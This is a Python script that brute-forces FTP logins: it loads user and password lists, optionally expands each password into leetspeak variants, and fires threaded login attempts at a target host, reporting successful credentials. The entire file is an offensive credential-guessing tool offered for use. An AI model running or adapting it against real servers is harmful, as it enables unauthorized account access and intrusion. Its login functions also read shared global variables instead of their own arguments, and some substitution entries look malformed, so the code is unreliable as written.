#!/usr/bin/python3   
                                                           
from ftplib import FTP, error_perm
from signal import signal, SIGINT
import argparse
import os
from colored import fore, style
import threading
import time

leet_alphabet = {
        'a':["a","4","@","^","aye","ci","λ","∂","ae"],
        'b':["b","8","|3","6","13","l3","],3","|o","1o","lo","ß","],],3","|8","l8","18","],8"],
        'c':["c","(","<","[","{","sea","see","k","©","¢","€"],
        'd':["d","|],","l],","1],","|)","l)","1)","[)","|}","l],","1}","],)","i>","|>","l>","1>","0","cl","o|","o1","ol","Ð","∂","ð"],
        'e':["e","3","&","[-","€","ii","ə","£","iii"],
        'f':["f","|:","],:","}","ph","(:","[:","ʃ","eph","ph"],
        'g':["g","6","9","&","(_+","C-","gee","jee","(Y,","cj","[","-","(γ,","(_-"],
        'h':["h","|-|","#","[-],","{-}","],-[",")-(","(-)",":-:","}{","}-{","╫","],],-[["],
        'i':["!","1","|","l","eye","3y3","ai","i"],
        'j':["j","_|","_/","],","</","_)","_l","_1","¿","ʝ","ul","u1","u|","jay","(/","_],"],
        'l':["l","1","7","|_","1_","l_","lJ","£","¬","el"],
        'm':["m","em","|v|","[v],","^^","nn","(V)","(\/)","|^^|","JVL"],
        'n':["n","~","₪","/|/","in"],
        #the ω is because Ω is mistakenly taken as that character sometimes...
        'o':["o","0","()","oh","[],","{}","¤","Ω","ω","*","[[],],","oh"],
        'p':["p","|*","l*","1*","|o","lo","1o","|>","l>","1>","?","9","[],d","|7","l7","17","q","|d","ld","1d","℗","|º","1º","lº","þ","¶","pee"],
        'q':["q","0_","o_","0,","o,","(,)","[,],","<|","<l","<1","cue","9","¶","kew"],
        'r':["r","|2","l2","12","2","/2","I2","|^","l^","1^","|~","l~","1~","lz","[z","|`","l`","1`",".-","®","Я","ʁ","|?","l?","1?","arr"],
        's':["s","5","$","z","es","2","§","š"],
        't':["t","7","+","-|-","-l-","-1-","1","'],['","†"],
        'u':["u","|_|","l_l","1_1","(_)","[_],","{_}","y3w","m","/_/","µ","yew","yoo","yuu"],
        'v':["v","√"],
        'w':["w","vv","(n)","uu","Ш","ɰ","1/1/"],
        'x':["x","%","><","><,","}{","ecks","x","*",")(","ex","Ж","×"],
        'y':["y","j","`/","`(","-/","'/","Ψ","φ","λ","Ч","¥","``//","wai"],
        'z':["z","2","~/_","%","7_","ʒ","≥","`/_"],
        'zero':["0","o","zero","cero","()"],
        'one':["1","won","one","l","|","],["],
        'two':["two","to","too","2","z"],
        'three':["e","3","three"],
        'four':["4","four","for","fore","a"],
        'five':["5","five","s"],
        'six':["6","six","g"],
        'seven':["7","seven","t","l"],
        'eight':["8","eight","b"],
        'nine':["9","nine","g"]
}

def handler(signal_received, frame):
    # Handle any cleanup here
    printmessage("red","[+], Exiting...")
    exit(0)

def printmessage(color, message):
    foreground:str = f"{fore(color)}"
    print(f'{foreground}{message}{style("reset")}')

def print_summary(users, passwords):
    printmessage("blue",f"[!], Users {len(users)}")
    printmessage("cyan",f"[!], Passwords {len(passwords)}")



def is_valid_ftp_login(host, username, password):
    try:
        ftp = FTP(host)
        ftp.login(username, password)
        ftp.quit()
        return True
    except error_perm as e:
        if "530 Permission denied" in str(e):
            printmessage("yellow",f"[!] {e} {user}:{password}")
        else:
            printmessage("red",f"[*] {e} {user}:{password}")
        return False
    except Exception as e:
        printmessage("red", f"[*] {e} {user}:{password}")
        return False

def leet_speak_combinaciones(texto):
    # Define un diccionario de reemplazos
    reemplazos = {
        'A': ['A', '4', '@'],
        'E': ['E', '3'],
        'G': ['G', '9'],
        'I': ['I', '1'],
        'L': ['L', '7'],
        'O': ['O', '0'],
        'S': ['S', '5'],
        'T': ['T', '7'],
        'Z': ['Z', '2'],
        'a': ["a","4","@","^","aye","ci","λ","∂","ae"],
        'b':["b","8","|3","6","13","l3","],3","|o","1o","lo","ß","],],3","|8","l8","18","],8"],
        'c':["c","(","<","[","{","sea","see","k","©","¢","€"],
        'd':["d","|],","l],","1],","|)","l)","1)","[)","|}","l],","1}","],)","i>","|>","l>","1>","0","cl","o|","o1","ol","Ð","∂","ð"],
        'e': ['e', '3'],
        'g': ['g', '9'],
        'i': ['i', '1'],
        'l': ['l', '7'],
        'o': ['o', '0'],
        's': ['s', '5'],
        't': ['t', '7'],
        'z': ['z', '2']
    }

    # Función recursiva para generar todas las combinaciones de leetspeak
    def generar_combinaciones(texto_actual, indice):
        if indice == len(texto_actual):
            combinaciones.append(texto_actual)
            return
        letra = texto_actual[indice]
        if letra in reemplazos:
            for reemplazo in reemplazos[letra]:
                generar_combinaciones(texto_actual[:indice] + reemplazo + texto_actual[indice + 1:], indice + 1)
        else:
            generar_combinaciones(texto_actual, indice + 1)

    combinaciones = []
    generar_combinaciones(texto, 0)

    return combinaciones
    
def try_login(username, password):
    
    if is_valid_ftp_login(host, user, pwd):
        printmessage("green", f"[*], Success {user}:{pwd}")
        #exit(0)

signal(SIGINT, handler)                    
parser=argparse.ArgumentParser()        
parser.add_argument("--host", help="input the address of the vulnerable host", type=str)
parser.add_argument("--user", help="username", type=str)
parser.add_argument("--password", help="password", type=str)
parser.add_argument("--leet", help="password", action="store_true")
parser.add_argument("--threads", type=int, default=10)
args = parser.parse_args()       
host = args.host
portFTP = 21 #if necessary edit this line
users = []
passwords = []

if os.path.isfile(args.user):
    f = open(args.user, 'r')
    users = f.readlines()
else:
    users.append(args.user)

if os.path.isfile(args.password):
    f = open(args.password, 'r')
    passwords = f.readlines()
else:
    passwords.append(args.password)

if args.leet:
    leetlist = []
    printmessage('cyan','Creating leet list')
    for pwd in passwords:
        l = leet_speak_combinaciones(pwd.strip())
        for leet in l:
            leetlist.append(leet)
    passwords=leetlist


print("\n")
print_summary(users, passwords)


for l in passwords:
    for user in users:
        while threading.active_count() >= args.threads:
            pass
        user = user.strip()
        pwd = l.strip()
        hilo = threading.Thread(target=try_login, args=(user,pwd,))
        hilo.start()